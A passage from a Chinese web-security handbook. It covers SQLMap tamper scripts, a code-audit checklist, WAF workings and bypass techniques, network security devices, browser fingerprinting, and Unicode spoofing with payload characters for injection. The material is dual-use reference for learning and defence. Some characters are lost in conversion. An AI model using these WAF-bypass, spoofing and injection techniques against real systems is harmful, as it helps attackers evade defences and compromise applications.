  space2mssqlblank.py            空格替换为其它空符号

  base64encode.py                用 base64 编码替换

  space2mssqlhash.py             替换空格

  modsecurityversioned.py        过滤空格，包含完整的查询版本注释

  space2mysqlblank.py            空格替换其它空白符号 (mysql)

  between.py                     用 between 替换大于号 (\>)

  space2mysqldash.py             替换空格字符 (")(' - ') 后跟一个破折号注释一个新行 (' n')

  multiplespaces.py              围绕 SQL 关键字添加多个空格
  -------------------------------------------------------------------------------------------------------------------

下

#### 11.5. SQLMap 使用 375

> 表 2 -- 续上页

------------------------------------------------------------------------------------------------------------------
  脚本名称                     作用
---------------------------- -------------------------------------------------------------------------------------
  space2plus.py                用 + 替换空格

  bluecoat.py                  代替空格字符后与一个有效的随机空白字符的 SQL 语句。然后替换 = 为 like

  nonrecursivereplacement.py   取代 predefined SQL 关键字 with 表示 suitable for 替代 (例如.replace("SELECT"、""))

  space2randomblank.py         代替空格字符 ("") 从一个随机的空白字符可选字符的有效集

  sp_password.py               追加 sp_password' 从 DBMS 日志的自动模糊处理的有效载荷的末尾

  chardoubleencode.py          双 url 编码 (不处理以编码的)

  unionalltounion.py           替换 UNION ALL SELECT UNION SELECT

  charencode.py                url 编码

  randomcase.py                随机大小写

  unmagicquotes.py             宽字符绕过 GPC addslashes

  randomcomments.py            用 /\*\*/ 分割 sql 关键字

  charunicodeencode.py         字符串 unicode 编码

  securesphere.py              追加特制的字符串

  versionedmorekeywords.py     注释绕过

  space2comment.py             Replaces space character \' \' with comments /\*\*/
  ------------------------------------------------------------------------------------------------------------------

<span id="_bookmark114" class="anchor"></span>CHAPTER 12

其他

1.  ## 代码审计

    1.  ### 简介

> 代码审计是找到应用缺陷的过程。其通常有白盒审计、黑盒审计、灰盒审计等方式。白盒审计指通过对源代码的分析找到应用缺陷，黑盒审计通常不涉及到源代码，多使用模糊测试的方式，而灰盒审计则是黑白结合的方式。三种不同的测试方法有不同的优缺点。

### 常用概念

#### 输入

> 输入通常也称 Source，Web 应用的输入可以是请求的参数（GET、POST 等）、上传的文件、Cookie、数据库数据等用户可控或者间接可控的地方。
>
> 例如 PHP 中的 \$\_GET / \$\_POST / \$\_REQUEST / \$\_COOKIE / \$\_FILES / \$\_SERVER 等，都可以作为应用的输入。

#### 处理函数

> 处理函数是对数据进行过滤或者编解码的函数，通常被称为 Clean/Filter/Sanitizer。这些函数会对输入进行安全操作或过滤，为漏洞利用带来不确定性。
>
> 同样以 PHP 为例，这样的函数可能是 mysqli_real_escape_string / htmlspecialchars / base64_encode
>
> / str_rot13 等，也可能是应用自定义的过滤函数。

#### 危险函数

> 危险函数又常叫做 Sink Call、漏洞点，是可能触发危险行为如文件操作、命令执行、数据库操作等行为的函数。
>
> 在 PHP 中，可能是 include / system / echo 等。

### 自动化审计

> 一般认为一个漏洞的触发过程是从输入经过过滤到危险函数的过程 (Source To Sink)，而审计就是寻找这个链条的过程。常见的自动化审计方案有危险函数匹配、控制流分析等。

#### 危险函数匹配

> 白盒审计最常见的方式是通过搜寻危险函数与危险参数定位漏洞，比较有代表性的工具是 Seay 开发的审计工具。这种方法误报率相当高，这是因为这种方法没有对程序的流程进行深入分析，另一方面，这种方式通常是孤立地分析每一个文件，忽略了文件之间复杂的调用关系。
>
> 具体的说，这种方式在一些环境下能做到几乎无漏报，只要审计者有耐心，可以发现大部分的漏洞，但是在高度框架化的代码中，能找到的漏洞相对有限。

#### 控制流分析

> 在后来的系统中，考虑到一定程度引入 AST 作为分析的依据，在一定程度上减少了误报，但是仍存在很多缺陷。
>
> 而后，Dahse J 等人设计了 RIPS，该工具进行数据流与控制流分析，结合过程内与过程间的分析得到审计结果，相对危险函数匹配的方式来说误报率少了很多，但是同样的也增加了开销。

#### 基于图的分析

> 基于图的分析是对控制流分析的一个改进，其利用 CFG 的特性和图计算的算法，一定程度上简化了计算，比较有代表性的是微软的 Semmle QL 和 NDSS 2017 年发表的文章 Efficient and Flexible Discovery of PHP Application Vulnerabilities。

#### 代码相似性比对

> 一些开发者会复制其他框架的代码，或者使用各种框架。如果事先有建立对应的漏洞图谱，则可使用相似性方法来找到漏洞。

#### 灰盒分析

> 基于控制流的分析开销较大，于是有人提出了基于运行时的分析方式，对代码进行 Hook，当执行到危险函数时自动回溯输入，找到输入并判断是否可用。
>
> 这种方式解决了控制流分析实现复杂、计算路径开销大的问题，在判断过滤函数上也有一定的突破，但是灰盒的方式并不一定会触发所有的漏洞。fate0 开发的 prvd 就是基于这种设计思路。

4.  ### 手工审计流程

    -   #### ![](media/image6.png){width="0.13194444444444445in" height="0.13194444444444445in"}获取代码，确定版 ，尝试初步分析

        -   找历史漏洞信息

        -   找应用该系统的实例

        -   确定依赖库是否存在漏洞

    -   基于审计工具进行初步分析

    -   #### 了解程序运行流程

        -   **文件加载方式**

            -   类库依赖

            -   是否加载 waf

        -   #### 数据库连接方式

            -   mysql/mysqli/pdo

            -   是否开启预编译

        -   #### 视图渲染

            -   XSS

            -   模版注入

        -   #### SESSION 处理机制

            -   文件

            -   数据库

            -   内存

        -   #### Cache 处理机制

            -   文件 cache 可能写 shell

            -   数据库 cache 可能注入

            -   memcache

    -   #### 账户体系

        -   Auth 方式

        -   Pre-Auth 的情况下可以访问的页面

        -   #### 普通用户的帐号

            -   能否可获取普通用户权限

        -   管理员账户默认密码

        -   #### 账号体系

            -   加密方式

            -   爆破密码

            -   重置漏洞

            -   #### 修改密码漏洞

> · 修改其他账号密码

-   **根据漏洞类型查找 Sink**

    -   **SQLi**

    -   **XSS**

&nbsp;

-   全局过滤能否 bypass

-   是否有直接执行 SQL 的地方

-   #### SQL 使用驱动，mysql/mysqli/pdo

> · 如果使用 PDO，搜索是否存在直接执行的部分

-   全局 bypass

-   视图渲染

    -   #### FILE

        -   查找上传功能点

        -   上传下载覆盖删除

        -   #### 包含

            -   LFI

            -   RFI

            -   全局找 include, require

    -   RCE

    -   XXE

&nbsp;

-   #### 过滤

&nbsp;

-   CSRF

-   SSRF

-   反序列化

-   变量覆盖

-   LDAP

-   XPath

-   Cookie 伪造

-   找 WAF 过滤方式，判断是否可以绕过

    1.  ### 参考链接 {#参考链接-55}

        -   [rips](https://github.com/ripsscanner/rips)

        -   [prvd](https://github.com/fate0/prvd)

        -   [PHP 运行时漏洞检测](http://blog.fatezero.org/2018/11/11/prvd/)

        -   Backes M , Rieck K , Skoruppa M , et al. Efficient and Flexible Discovery of PHP Application Vulnerabilities\[C\]// IEEE European Symposium on Security & Privacy. IEEE, 2017.

        -   Dahse J. RIPS-A static source code analyser for vulnerabilities in PHP scripts\[J\]. Retrieved: February, 2010, 28: 2012.

    &nbsp;

    1.  # WAF

        1.  ### 简介

#### 概念

> WAF（Web Application Firewall，Web 应用防火墙）是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供加固的产品。
>
> 在市场上，有各种价格各种功能和选项的 WAF。在一定程度上，WAF 能为 Web 应用提供安全性，但是不能保证完全的安全。

#### 常见功能

-   检测异常协议，拒绝不符合 HTTP 标准的请求

-   对状态管理进行会话保护

-   Cookies 保护

-   信息泄露保护

-   DDoS 防护

-   禁止某些 IP 访问

-   可疑 IP 检查

-   #### 安全 HTTP 头管理

    -   X-XSS-Protection

    -   X-Frame-Options

-   #### 机制检测

    -   CSRF token

    -   HSTS

#### 布置位置

> 按布置位置，WAF 可以分为云 WAF、主机防护软件和硬件防护。云 WAF 布置在云上，请求先经过云服务器而后流向主机。主机防护软件需要主机预先安装对应软件，如 mod_security、ngx-lua-waf 等，对主机进行防护。硬件防护指流量流向主机时，先经过设备的清洗和拦截。

### 防护方式

> WAF 常用的方法有关键字检测、正则表达式检测、语法分析、行为分析、声誉分析、机器学习等。
>
> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}基于正则的保护是最常见的保护方式。开发者用一些设定好的正则规则来检测载荷是否存在攻击性。基于正则的防护较为简单，因此存在一些缺点。例如只能应用于单次请求，而 正则很难应用到一些复杂的协议上。
>
> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}基于语法的分析相对正则来说更快而 更准确，这种分析会把载荷按照语法解析成的符号组，然后在符号组中寻找危险的关键字。这种方式对一些载荷的变式有较好的效果，但是同样的，对解析器要求较高。
>
> 基于行为的分析着眼的范围更广一些，例如攻击者的端口扫描行为、目录爆破、参数测试或者一些其他自动化或者攻击的模式都会被纳入考虑之中。
>
> 基于声誉的分析可以比较好的过滤掉一些可疑的来源，例如常用的 VPN、匿名代理、Tor 节点、僵尸网络节点的 IP 等。
>
> 基于机器学习的 WAF 涉及到的范围非常广，效果也因具体实现和场景而较为多样化。
>
> 除了按具体的方法分，也可以根据白名单和黑名单的使用来分类。基于白名单的 WAF 适用于稳定的 Web
>
> 应用，而基于黑名单则适合处理已知问题。

3.  ### 扫描器防御

    -   基于 User-Agent 识别

    -   基于攻击载荷识别

    -   验证码

4.  ### WAF 指纹

    -   额外的 Cookie

    -   额外的 Header

    -   被拒绝请求时的返回内容

    -   被拒绝请求时的返回响应码

    -   IP

5.  ### 绕过方式

#### 基于架构的绕过

-   站点在 WAF 后，但是站点可直连

-   站点在云服务器中，对同网段服务器无 WAF

#### 基于资源的绕过

-   使用消耗大的载荷，耗尽 WAF 的计算资源

-   提供大量的无效参数

#### 基于解析的绕过

-   字符集解析不同

-   #### 协议覆盖不全

    -   POST 的 JSON 传参 / form-data / multipart/form-data

-   协议解析不正确

-   站点和 WAF 对 https 有部分不一致

-   #### WAF 解析与 Web 服务解析不一致

    -   部分 ASP+IIS 会转换 %u0065 格式的字符

    -   Apache 会解析畸形 Method

    -   同一个参数多次出现，取的位置不一样

    -   HTTP Parameter Pollution (HPP)

    -   HTTP Parameter Fragmentation (HPF)

> **基于规则的绕过**

-   **等价替换**

    -   **大小写变换**

        -   select =\> sEleCt

        -   \<sCrIpt\>alert(1)\</script\>

    -   #### 字符编码

        -   URL 编码

        -   十六进制编码

        -   Unicode 解析

        -   Base64

        -   HTML

        -   JSFuck

        -   其他编码格式

    -   等价函数

    -   等价变量

    -   关键字拆分

    -   字符串操作

-   #### 字符干扰

    -   **空字符**

        -   NULL (x00)

        -   空格

        -   回车 (x0d)

        -   换行 (x0a)

        -   垂直制表 (x0b)

        -   水平制表 (x09)

        -   换页 (x0c)

    -   注释

-   #### 特殊符号

    -   注释符

    -   引号（反引号、单引号、双引号）

-   #### ![](media/image6.png){width="0.13194444444444445in" height="0.13194444444444445in"}利用服务 身特点

    -   **替换可疑关键字为空**

        -   selselectect =\> select

-   少见特性未在规则列表中

6.  ### 参考链接 {#参考链接-56}

    -   [WAF 攻防研究之四个层次 Bypass WAF](https://www.weibo.com/ttarticle/p/show?id=2309404007261092631700&sudaref=www.google.com.hk&display=0&retcode=6102)

    -   [我的 WafBypass 之道 SQL 注入篇](https://xz.aliyun.com/t/368)

    -   [WAF through the eyes of hackers](https://habr.com/en/company/dsec/blog/454592/)

&nbsp;

2.  ## 常见网络设备

    1.  ### 防火墙

#### 简介

> 防火墙指的是一个有软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的界面上构造的保护屏障。它可通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护。
>
> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}防火墙可以分为网络层防火墙和应用层防火墙。网络层防火墙基于源地址和目的地址、应用、协议以及每个 IP 包的端口来作出通过与否的判断。应用层防火墙针对特别的网络应用服务协议即数据过滤协议，并 能够对数据包分析并形成相关的报告。

#### 主要功能

-   过滤进、出网络的数据

-   防止不安全的协议和服务

-   管理进、出网络的访问行为

-   记录通过防火墙的信息内容

-   对网络攻击进行检测与警告

-   防止外部对内部网络信息的获取

-   提供与外部连接的集中管理

#### 下一代防火墙

> 主要是一款全面应对应用层威胁的高性能防火墙。可以做到智能化主动防御、应用层数据防泄漏、应用层洞察与控制、威胁防护等特性。下一代防火墙在一台设备里面集成了传统防火墙、IPS、应用识别、内容过滤等功能既降低了整体网络安全系统的采购投入，又减去了多台设备接入网络带来的部署成本，还通过应用识别和用户管理等技术降低了管理人员的维护和管理成本。

### IDS

#### 简介

> 入侵检测即通过从网络系统中的若干关键节点收集并分析信息，监控网络中是否有违反安全策略的行为或者是否存在入侵行为。入侵检测系统通常包含 3 个必要的功能组件：信息来源、分析引擎和响应组件。
>
> 信息收集包括收集系统、网络、数据及用户活动的状态和行为。入侵检测利用的信息一般来自：系统和网络日志文件、非正常的目录和文件改变、非正常的程序执行这三个方面。
>
> 分析引擎对收集到的有关系统、网络、数据及用户活动的状态和行为等信息，是通过模式匹配、统计分析和完整性分析这三种手段进行分析的。前两种用于实时入侵检测，完整性分析用于事后分析。
>
> 告警与响应根据入侵性质和类型，做出相应的告警与响应。

#### 主要类型

> IDS 可以分为基于主机的入侵检测系统 (HIDS) 和基于网络的入侵检测系统 (NIDS)。
>
> 基于主机的入侵检测系统是早期的入侵检测系统结构，通常是软件型的，直接安装在需要保护的主机上。其检测的目标主要是主机系统和系统本地用户，检测原理是根据主机的审计数据和系统日志发现可疑事件。
>
> 这种检测方式的优点主要有：信息更详细、误报率要低、部署灵活。这种方式的缺点主要有：会降低应用系统的性能；依赖于服务器原有的日志与监视能力；代价较大；不能对网络进行监测；需安装多个针对不同系统的检测系统。
>
> 基于网络的入侵检测方式是目前一种比较主流的监测方式，这类检测系统需要有一台专门的检测设备。检测设备放置在比较重要的网段内，不停地监视网段中的各种数据包，而不再是只监测单一主机。它对所监测的网络上每一个数据包或可疑的数据包进行特征分析，如果数据包与产品内置的某些规则吻合，入侵检测系统就会发出警报，甚至直接切断网络连接。目前，大部分入侵检测产品是基于网络的。
>
> 这种检测技术的优点主要有：能够检测那些来自网络的攻击和超过授权的非法访问；不需要改变服务器等主机的配置，也不会影响主机性能；风险低；配置简单。其缺点主要是：成本高、检测范围受局限；大量计算，
>
> 影响系统性能；大量分析数据流，影响系统性能；对加密的会话过程处理较难；网络流速高时可能会丢失许多封包，容易让入侵者有机可乘；无法检测加密的封包；对于直接对主机的入侵无法检测出。

### IPS（入侵防御系统）

#### 简介

> 入侵防御系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。
>
> 串行部署的防火墙可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。旁路部署的 IDS 可以及时发现那些穿透防火墙的深层攻击行为，作为防火墙的有益补充，但是无法实时的阻断。
>
> 因此出现了基于 IDS 和防火墙联动的 IPS：通过 IDS 来发现，通过防火墙来阻断。但由于迄今为止没有统一的接口规范，加上越来越频发的"瞬间攻击"（一个会话就可以达成攻击效果，如 SQL 注入、溢出攻击等），使得 IDS 与防火墙联动在实际应用中的效果不显著。

#### 主要类型

> 可以分为基于特征的 IPS、基于异常的 IPS、基于策略的 IPS、基于协议分析的 IPS。
>
> 基于特征的 IPS 是许多 IPS 解决方案中最常用的方法。把特征添加到设备中，可识别当前最常见的攻击。也被称为模式匹配 IPS。特征库可以添加、调整和更新，以应对新的攻击。
>
> 基于异常的 IPS 也被称为基于行规的 IPS。基于异常的方法可以用统计异常检测和非统计异常检测。
>
> 基于策略的 IPS 更关心的是是否执行组织的安保策略。如果检测的活动违反了组织的安保策略就触发报警。使用这种方法的 IPS，要把安全策略写入设备之中。
>
> 基于协议分析的 IPS 与基于特征的方法类似。大多数情况检查常见的特征，但基于协议分析的方法可以做更深入的数据包检查，能更灵活地发现某些类型的攻击。

### 安全隔离网闸

#### 简介

> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}安全隔离网闸是使用带有多种控制功能的固态开关读写介质连接两个独立网络系统的信息安全设备。由于物理隔离网闸所连接的两个独立网络系统之间，不存在通信的物理连接、逻辑连接、信息传输命令、信息传输协议，不存在依据协议的信息包转发，只有数据文件的无协议"摆渡"， 对固态存储介质只有"读"和"写"两个命令。所以，物理隔离网闸从物理上隔离、阻断了具有潜在攻击可能的一切连接，使攻击者无法入侵、无法攻击、无法破坏，实现了真正的安全。

#### 主要功能

> 阻断网络的直接物理连接：物理隔离网闸在任何时刻都只能与非可信网络和可信网络上之一相连接，而不能同时与两个网络连接。
>
> 阻断网络的逻辑连接：物理隔离网闸不依赖操作系统、不支持 TCP/IP 协议。两个网络之间的信息交换必须将 TCP/IP 协议剥离，将原始数据通过 P2P 的非 TCP/IP 连接方式，通过存储介质的"写入"与"读出"完成数据转发。
>
> 安全审查：物理隔离网闸具有安全审查功能，即网络在将原始数据"写入"物理隔离网闸前，根据需要对原始数据的安全性进行检查，把可能的病毒代码、恶意攻击代码过滤掉。
>
> 原始数据无危害性：物理隔离网闸转发的原始数据，不具有攻击或对网络安全有害的特性。管理和控制功能：建立完善的日志系统。
>
> 根据需要建立数据特征库：在应用初始化阶段，结合应用要求，提取应用数据的特征，形成用户特有的数据特征库，作为运行过程中数据校验的基础。当用户请求时，提取用户的应用数据，抽取数据特征和原始数据特征库比较，符合原始特征库的数据请求进入请求队列，不符合的返回用户，实现对数据的过滤。
>
> 根据需要提供定制安全策略和传输策略的功能：用户可以自行设定数据的传输策略，如：传输单位（基于数据还是基于任务）、传输间隔、传输方向、传输时间、启动时间等。
>
> 支持定时/实时文件交换；支持支持单向/双向文件交换；支持数字签名、内容过滤、病毒检查等功能。

### VPN 设备

#### 简介

> 虚拟专用网络指的是在公用网络上建立专用网络的技术。之所以称为虚拟网主要是因为整个 VPN 网络的任意两个节点之间的连接并没有传统专网所需的端到端的物理链路，而是架构在公用网络服务商所提供的网络平台之上的逻辑网络，用户数据在逻辑链路中传输。

#### 常用技术

> MPLS VPN：是一种基于 MPLS 技术的 IP VPN，是在网络路由和交换设备上应用 MPLS（多协议标记交换）技术，简化核心路由器的路由选择方式，利用结合传统路由技术的标记交换实现的 IP 虚拟专用网络（IP VPN）。MPLS 优势在于将二层交换和三层路由技术结合起来，在解决 VPN、服务分类和流量工程这些 IP网络的重大问题时具有很优异的表现。因此，MPLS VPN 在解决企业互连、提供各种新业务方面也越来越被运营商看好，成为在 IP 网络运营商提供增值业务的重要手段。MPLS VPN 又可分为二层 MPLS VPN（即 MPLS L2 VPN）和三层 MPLS VPN（即 MPLS L3 VPN）。
>
> SSL VPN：是以 HTTPS（SecureHTTP，安全的 HTTP，即支持 SSL 的 HTTP 协议）为基础的 VPN 技术，工作在传输层和应用层之间。SSL VPN 充分利用了 SSL 协议提供的基于证书的身份认证、数据加密和消息完整性验证机制，可以为应用层之间的通信建立安全连接。SSL VPN 广泛应用于基于 Web 的远程安全接入，为用户远程访问公司内部网络提供了安全保证。
>
> IPSecVPN 是基于 IPSec 协议的 VPN 技术，由 IPSec 协议提供隧道安全保障。IPSec 是一种由 IETF 设计的端到端的确保基于 IP 通讯的数据安全性的机制。它为 Internet 上传输的数据提供了高质量的、可互操作的、基于密码学的安全保证。

### 安全审计系统

#### 简介

> 网络安全审计系统针对互联网行为提供有效的行为审计、内容审计、行为报警、行为控制及相关审计功能。从管理层面提供互联网的有效监督，预防、制止数据泄密。满足用户对互联网行为审计备案及安全保护措施的要求，提供完整的上网记录，便于信息追踪、系统安全管理和风险防范。

7.  ### 参考链接 {#参考链接-57}

    -   [网络安全设备](https://wenku.baidu.com/view/2b5540cca32d7375a517806a.html)

&nbsp;

3.  ## 指纹

    1.  ### 浏览器指纹

        -   #### 软件细节

            -   navigator

            -   安装插件

            -   浏览器支持的特性

            -   CSS 支持

            -   JavaScript 特性

            -   已安装字体

> **--** \...

-   #### WebGL 信息

    -   GL 版本

    -   纹理大小

    -   渲染缓冲区

    -   WebGL 扩展

> **--** \...

-   #### 硬件信息

> **12.4. 指纹** **389**

-   电池 API

-   传感器 API

-   WebRTC 获取流媒体设备

-   系统性能

> **--** \...

-   #### 持久化存储

    -   cookie

    -   localStorage

    -   indexedDB

    -   sessionStorage

-   #### 系统设置

    -   时钟偏移

-   #### 主动探测

    -   构造特定 DNS 请求并发送

2.  ### 参考链接 {#参考链接-58}

    -   [设备指纹指南](https://mp.weixin.qq.com/s/ClG5cgv9Cu7zoyPcWOoU4A)

&nbsp;

4.  ## Unicode

    1.  ### 基本概念

#### BMP

> BMP (Basic Multilingual Plane)，译作基本多文种平面，是 Unicode 中的一个编码区块。

#### 码平面

> Unicode 编码点分为 17 个平面（plane），每个平面包含 2\^16（即 65536）个码位。17 个平面的码位可表示为从 U+xx0000 到 U+xxFFFF，其中 xx 表示十六进制值从 0016 到 1016，共计 17 个平面。

#### Code Point

> Code Point 也被称作 Code Position，译作码位或编码位置，是指组成代码空间的数值。

#### Code Unit

> 指某种 Unicode 编码方式里编码一个 Code Point 需要的最少字节数，比如 UTF-8 需要最少一个字节，UTF- 16 最少两个字节，UCS-2 两个字节，UCS-4 和 UTF-32 四个字节。

#### Surrogate Pair

> Surrogate Pair 是用于 UTF-16 的以向后兼容 UCS-2 的，做法是取 UCS-2 范围里的 0xD800\~0xDBFF (称为 high surrogates) 和 0xDC00\~0xDFFF (称为 low surrogates) 的码位，一个 high surrogate 接一个 low surrogate 拼成四个字节表示超出 BMP 的字符，两个 surrogate range 都是 1024 个码位，所以 surrogate pair可以表达 1024 x 1024 = 1048576 = 0x100000 个字符。

#### Combining Character

> 例如 He̊llö 含有重音符号之类的字符，进行组合会使用大量的码位。所以这种字符多用组合的方式来实现。

#### BOM

> 字节顺序标记（byte-order mark，BOM）是一个有特殊含义的统一码字符，码点为 U+FEFF 。当以 UTF-16 或 UTF-32 来将 UCS 字符所组成的字符串编码时，这个字符被用来标示其字节序。常被用于区分是否为 UTF编码。

### 编码方式

#### UCS-2

> UCS-2 (2-byte Universal Character Set) 是一种定长的编码方式，UCS-2 仅仅简单的使用一个 16 位码元来表示码位，也就是说编码范围在 0 到 0xFFFF 的码位范围内。

#### UTF-8

> UTF-8（8-bit Unicode Transformation Format）是一种针对 Unicode 的可变长度字符编码，也是一种前缀码。它可以用一至四个字节对 Unicode 字符集中的所有有效编码点进行编码，属于 Unicode 标准的一部分。编码方式如下

[TABLE]

#### UTF-16

> UTF-16 (16-bit Unicode Transformation Format) 是 UCS-2 的拓展，用一个或者两个 16 位的码元来表示码位，可以对 0 到 0x10FFFF 的码位进行编码。

### 等价性问题

#### 简介

Unicode（统一码）包含了许多特殊字符，为了使得许多现存的标准能够兼容，提出了 Unicode 等价性（Unicode equivalence）。在字符中，有些在功能上会和其它字符或字符序列等价。因此，Unicode 将一些码位序列定义成相等的。

Unicode 提供了两种等价概念：标准等价和兼容等价。前者是后者的一个子集。例如，字符 n 后接着组合字符 *\~* 会（标准和兼容）等价于 Unicode 字符 ñ。而合字 ff 则只有兼容等价于两个 f 字符。

Unicode 正规化是文字正规化的一种形式，是指将彼此等价的序列转成同一列序。此序列在 Unicode 标准中称作正规形式。

对于每种等价概念，Unicode 又定义两种形式，一种是完全合成的，一种是完全分解的。因此，最后会有四种形式，其缩写分别为：NFC、NFD、NFKC、NFKD。对于 Unicode 的文字处理程序而言，正规化是很重要的。因为它影响了比较、搜索和排序的意义。

#### 标准等价

统一码中标准等价的基础概念为字符的组成和分解的交互使用。合成指的是将简单的字符合并成较少的预组字符的过程，如字符 n 和组合字符 *\~* 可以组成统一码 ñ。分解则是反向过程，即将预组字符变回部件。

标准等价是指保持视觉上和功能上的等价。例如，含附加符号字母被视为和分解后的字母及其附加符号是标准等价。换句话说，预组字符'ü'和由'u'及'¨'所组成的序列是标准等价。相似地，统一码统合了一些希腊附加符号和外观与附加符号类似的标点符号。

#### 兼容等价

兼容等价的范围较标准等价来得广。如果序列是标准等价的话就会是兼容等价，反之则未必对。兼容等价更关注在于纯文字的等价，并把一些语义上的不同形式归结在一起。

例如，上标数字和其所使用的数字是兼容等价，但非标准等价。其理由为下标和上标形式虽然在某些时侯属于不同意义，但若应用程序将他们视为一样也是合理的（虽然视觉上可区分）。如此，在统一码富文件中，上标和下标就可以以比较不累赘地方式出现（见下一节）。

全角和半角的片假名也是一种兼容等价但不是标准等价。如同合字和其部件序列。其只有视觉上但没有语义上的区别。换句话说，作者通常没有特别宣称使用合字是一种意思，而不使用是另一种意思。相对地，这尽限于印刷上的选择。

文字处理软件在实现统一码字符串的搜索和排序时，须考虑到等价性的存在。如果没有此特性的话，用户在搜索时将无法找到在视觉上无法区分的字形。

统一码提供了一个标准的正规化算法，可将所有相同的序列产生一个唯一的序列。其等价准绳可以为标准的

（NF）或兼容的（NFK）。既然可以任意选择等价类中的元素，对每一个等价标准有多个标准形式也是有可能的。统一码为每一种等价准绳分别提供两种正规形式：合成用的 NFC 和 NFKC 以及分解用的 NFD 和 NFKD。而不论是组合的或分解的形式，都会使用标准顺序，以此限制正规形式只有唯一形式。

#### 正规化

为了比较或搜索统一码字符串，软件可以使用合成或分解形式其中之一。只要被比较或搜索的字符串使用的形式是相同的，哪种选择都没关系。另一方面，等价概念的选择则会影响到搜索结果。譬如，有些合字如ffi（U+FB03）、罗马数字如 （U+2168），甚至是上标数字如5（U+2075）有其个别统一码码位。标准正规形式并不会影响这些结果。但兼容正规形式会分解 ffi 成 f、f、i。所以搜索 U+0066（f）时，在 NFKC 中会成功，但在 NFC 则会失败。同样地有在预组罗马数字 中搜索拉丁字母 I（U+0049）。类似地，"5"会转成"5"。

对于浏览器，将上标转换成到基下划线未必是好的，因为上标的信息会因而消失。为了允许这种不同，统一码字符数据库句含了兼容格式标签，其提供了兼容转换的细节。在合字的情况下，这个标签只是 \<compat\> ，而在上标的情况下则为 \<super\> 。丰富文件格式如超文本置标语言则会使用兼容标签。例如，HTML 使用自定义标签来将"5"放到上标位置。

#### 正规形式

-   NFD Normalization Form Canonical Decomposition 以标准等价方式来分解

-   NFC Normalization Form Canonical Composition 以标准等价方式来分解，然后以标准等价重组之。若是 singleton 的话，重组结果有可能和分解前不同。

-   NFKD Normalization Form Compatibility Decomposition 以兼容等价方式来分解 NFKC

-   Normalization Form Compatibility Composition 以兼容等价方式来分解，然后以标准等价重组之

    1.  ### Tricks

        -   部分语言的长度并不是字符的长度，一个 UTF-16 可能是两位。

        -   部分语言在翻转 UTF-16 等多字节编码时，会处理错误。

    2.  ### 安全问题

#### Visual Spoofing

> 例如 b idu.com(此处的 a 为 u0430) 和 baidu.com(此处的 a 为 x61) 视觉上相同，但是实际上指向两个不同的域名。
>
> b ａ idu.com(此处的 a 为 uff41) 和 baidu.com(此处的 a 为 x61) 有一定的不同，但是指向两个相同的域名。这种现象可以引起一些 Spoofing 或者 WAF Bypass 的问题。

#### Best Fit

> 如果两个字符前后编码不同，之前的编码在之后的编码没有对应，程序会尝试找最佳字符进行自动转换。当宽字符变成了单字节字符，字符编码会有一定的变化。
>
> 这种现象可能引起一些 WAF Bypass。

#### Syntax Spoofing

> 以下四个 Url 在语法上看来是没问题的域名，但是用来做分割的字符并不是真正的分割字符，而是 U+2044(
>
> ⁄ )，可以导致一些 UI 欺骗的问题。

-   <http://macchiato.com/x.bad.com> macchiato.com/x bad.com

-   [http://macchiato.com?x.bad.com](http://macchiato.com/?x.bad.com) macchiato.com?x bad.com

-   [http://macchiato.com.x.bad.com](http://macchiato.com.x.bad.com/) macchiato.com.x bad.com

-   [http://macchiato.com#x.bad.com](http://macchiato.com/#x.bad.com) macchiato.com#x bad.com

#### Punycode Spoofs

-   ![](media/image7.png)http:// .com [http://xn\--google.com](http://xn--google.com/)

-   ![](media/image7.png){width="0.125in" height="0.1284722222222222in"}http:// .com [http://xn\--cnn.com](http://xn--cnn.com/)

-   ![](media/image7.png)[http://岍](http://岍/) .com [http://xn\--citibank.com](http://xn--citibank.com/)

> 有些浏览器会直接显示 puncode，但是也可以借助这种机制实现 UI Spooof。

#### Buffer Overflows

> 在编码转换的时候，有的字符会变成多个字符，如 Fluß *→* FLUSS *→* fluss 这样可能导致 BOF。

### 常见载荷

#### URL

-   ![](media/image7.png){width="0.125in" height="0.1284722222222222in"}(U+2025)

-   ![](media/image7.png){width="0.125in" height="0.1284722222222222in"}(U+FE30)

-   。 (U+3002)

-   (U+24EA)

-   ／ (U+FF0F)

-   ｐ (U+FF50)

-   (U+02B0)

-   ª (U+00AA)

#### SQL 注入

-   ＇ (U+FF07)

-   ＂ (U+FF02)

-   (U+FE63)

#### XSS

-   ＜ (U+FF1C)

-   ＂ (U+FF02)

#### 命令注入

-   ＆ (U+FF06)

-   ｜ (U+FF5C)

#### 模板注入

-   ![](media/image7.png){width="0.125in" height="0.1284722222222222in"}(U+FE5B)

> •［ (U+FF3B)

### 参考链接 {#参考链接-59}

#### 官方文档

-   [Unicode equivalence](https://en.wikipedia.org/wiki/Unicode_equivalence)

-   [Unicode Normalization Forms](http://unicode.org/reports/tr15/)

-   [Unicode Security Considerations](http://unicode.org/reports/tr36/)

#### RFC

-   [RFC 3629](https://tools.ietf.org/html/rfc3629) UTF-8, a transformation format of ISO 10646

-   [RFC 2044](https://tools.ietf.org/html/rfc2044) UTF-8, a transformation format of ISO 10646

-   [RFC 2279](https://tools.ietf.org/html/rfc2279) UTF-8, a transformation format of ISO 10646

#### Tricks / Blogs

-   [IDN homograph attack](https://en.wikipedia.org/wiki/IDN_homograph_attack)

-   [Black Hat Unicode Security](https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-PAPER.pdf)

-   [Request encoding to bypass web application firewalls](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/)

-   [domain hacks with unusual unicode characters](https://shkspr.mobi/blog/2018/11/domain-hacks-with-unusual-unicode-characters/)

-   [其实你并不懂 Unicode](https://zhuanlan.zhihu.com/p/53714077)

# JSON

> JSON (JavaScript Object Notation) 是许多数据格式通信的基石。

1.  ### 安全风险

    -   重复的 key {\"test\": 1, \"test\": 2}
